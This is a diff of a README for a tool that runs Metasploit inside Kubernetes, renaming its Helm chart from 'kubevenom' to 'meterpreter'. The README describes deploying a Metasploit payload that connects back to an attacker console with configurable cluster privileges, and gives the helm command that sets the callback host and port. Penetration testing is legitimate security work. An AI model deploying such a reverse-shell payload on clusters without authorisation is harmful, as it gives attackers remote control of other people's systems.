@@ -3,7 +3,7 @@
 
 Running metasploit framework against Kubernetes enables pentesters to security test cluster components such as the API Server, as well as internal application components or micro-services.
 
-The installation chart (kubevenom) also offers to install & run a metasploit payload, that connects back to metasploit console.
+The installation chart (meterpreter) also offers to install & run a metasploit payload, that connects back to metasploit console.
 The payload can be deployed with different priviliges and permissions with respect to Kubernetes node hosting metasploit payload, as well as Kubernetes API server itself - see 'priviliges' section under values.yaml
 
 ```yaml
@@ -37,10 +37,10 @@ priviliges:
 2. Make sure you have an available Kubernetes cluster to deploy metasploit. You can install a local Kubernetes cluster using [KIND](https://kind.sigs.k8s.io/docs/user/quick-start/#installation)
     > You can create local KIND cluster by running  `make create-kind-cluster`
 
-3. Install kubevenom helm chart by running:
+3. Install meterpreter helm chart by running:
 
 ```sh
 export MSF_PORT="<routeable port from inside cluster>"
 export MSF_IPADDRESS="<routeable ip from inside cluster>"
-helm upgrade --create-namespace -i -n metasploit kubevenom ./kubevenom --set lport=$MSF_PORT --set lhost=$MSF_IPADDRESS
+helm upgrade --create-namespace -i -n metasploit meterpreter ./meterpreter --set lport=$MSF_PORT --set lhost=$MSF_IPADDRESS
 ```
